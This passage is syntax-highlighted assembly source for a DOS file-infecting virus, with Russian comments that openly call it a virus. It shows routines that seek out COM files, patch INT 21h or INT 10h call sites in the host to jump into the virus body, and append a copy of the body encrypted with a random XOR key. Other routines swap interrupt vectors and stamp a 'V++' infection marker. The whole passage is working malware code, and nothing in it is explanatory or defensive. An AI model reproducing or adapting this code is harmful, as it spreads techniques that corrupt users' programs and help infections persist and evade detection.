</span><span class="sc5">Scan</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Cont_Infect</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func4200h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Lseek File</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_0000h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">           </span><span class="sc1">;тут будет переход на тело вируса</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Ofs</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;вычисляем смещение для Call вирус</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Byte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">0E8h</span><span class="sc0">  </span><span class="sc1">;Call Entry_Point</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">           </span><span class="sc1">;Dx:=Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func40h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Write File ***1</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_0003h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">          </span><span class="sc1">;Записали команду перехода</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func4202h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Lseek File</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_0000h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;ушли на конец файла</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;***2</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Byte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_0003h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;OPTI-лучше MovSW, MovSB</span><span class="sc0">
    </span><span class="sc6">Rep</span><span class="sc0"> </span><span class="sc6">MovSB</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;OPTI-***1 Push Si,Pop Dx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Shifr</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">Vir_Lenght</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func40h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Write_File (OPTI ***2 Push Ax,Pop Ax)</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;Дописали вирус</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Cont_Infect</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Set_Int21h</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">Cli</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc5">DOSInt</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Int 20h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Int 21h</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc5">DOSInt</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">    </span><span class="sc1">;Opti-Mov R,M; Xchg R,M; Mov M,R</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc5">DOSInt</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Int 20h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Int 21h</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc5">DOSInt</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0"> </span><span class="sc1">;Opti-Mov R,M; Xchg R,M; Mov M,R</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Sti</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Set_Int21h</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">@Restore_Byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ClD</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">          </span><span class="sc1">;адрес возврата</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Byte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;OPTI-я же писал, это лишнее</span><span class="sc0">
    </span><span class="sc6">MovSB</span><span class="sc0">
    </span><span class="sc6">MovSW</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Ok_Restore</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">PushA</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func3Fh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Read File</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;считываем 1024 байта</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_Int10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Scan</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">

</span><span class="sc1">;   Cmp Di,0FFFFh       ;OPTI-Inc Di</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">        </span><span class="sc1">;Tasm тута оптимизирует ;-))</span><span class="sc0">
    </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;для совместимости кода</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0FFFFh</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Scan_CD21h</span><span class="sc0">     </span><span class="sc1">;не нашли поищем 21CDh</span><span class="sc0">
</span><span class="sc5">@Infect21</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Cont_Infect</span><span class="sc0">     </span><span class="sc1">;Поедем заражать</span><span class="sc0">

</span><span class="sc5">@Exit_Infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">PopA</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">@Scan_CD21h</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_Int21h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">;OPTI-Mov Bl,02h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Scan</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">

</span><span class="sc1">;   Cmp Di,0FFFFh       ;OPTI-Inc Di</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">        </span><span class="sc1">;Tasm тута оптимизирует ;-))</span><span class="sc0">
    </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;для совместимости кода</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0FFFFh</span><span class="sc0">

    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Exit_Infect</span><span class="sc0">        </span><span class="sc1">;Тут нет и 21CDh, придется отвалить</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Infect21</span><span class="sc0">       </span><span class="sc1">;Поедем заражать</span><span class="sc0">

</span><span class="sc1">;OPTI - и вообще этот кусок идентичен поиску 10CDh</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Random</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Ah</span><span class="sc0">
    </span><span class="sc6">In</span><span class="sc0">  </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Ah</span><span class="sc0">
    </span><span class="sc6">Jnb</span><span class="sc0"> </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Al</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Random</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Shifr</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">           </span><span class="sc1">;Buffer</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">           </span><span class="sc1">;начало вируса</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">Part2</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bl</span><span class="sc4">,</span><span class="sc8">Bh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Word_Shifr</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">   </span><span class="sc1">;Opti-[Si]</span><span class="sc0">
    </span><span class="sc6">Repe</span><span class="sc0">    </span><span class="sc6">MovSB</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">Shifr_Lenght</span><span class="sc0">     </span><span class="sc1">;Opti-Mov Cx,266 Shr 1</span><span class="sc0">
    </span><span class="sc6">Shr</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">@LShifr2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">LodSW</span><span class="sc0">
    </span><span class="sc6">Not</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Not</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">@LShifr2</span><span class="sc0">        </span><span class="sc1">;зашифровываем основное тело вируса</span><span class="sc0">
    
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'+V'</span><span class="sc0">         </span><span class="sc1">;метка вируса</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc12">'+'</span><span class="sc0">
    </span><span class="sc6">StoSB</span><span class="sc0">

    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Shifr</span><span class="sc0">   </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;----------------------------------------</span><span class="sc0">
</span><span class="sc1">;Функции и константы вируса</span><span class="sc0">
</span><span class="sc5">Func40h</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">Func4202h</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">4202h</span><span class="sc0">
</span><span class="sc5">Func3Eh</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3Eh</span><span class="sc0">
</span><span class="sc5">Func3D02h</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">3D02h</span><span class="sc0">
</span><span class="sc5">Func4Fh</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4Fh</span><span class="sc0">
</span><span class="sc5">Func4301h</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">4301h</span><span class="sc0">
</span><span class="sc5">Func3Fh</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3Fh</span><span class="sc0">
</span><span class="sc5">Func4200h</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">4200h</span><span class="sc0">
</span><span class="sc5">_0003h</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0003h</span><span class="sc0">
</span><span class="sc5">AtrF</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FEh</span><span class="sc0">
</span><span class="sc5">Func4Eh</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4Eh</span><span class="sc0">
</span><span class="sc5">Mask_Com</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.com'</span><span class="sc0">
</span><span class="sc5">_0000h</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">Func2Fh</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02Fh</span><span class="sc0">
</span><span class="sc5">Func1Ah</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1Ah</span><span class="sc0">
</span><span class="sc5">_Int10h</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">_Int21h</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Save_Byte</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc5">Shifr_Lenght</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Part2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">

</span><span class="sc5">StrVpp</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'V++'</span><span class="sc0">
</span><span class="sc5">Vir_Lenght</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
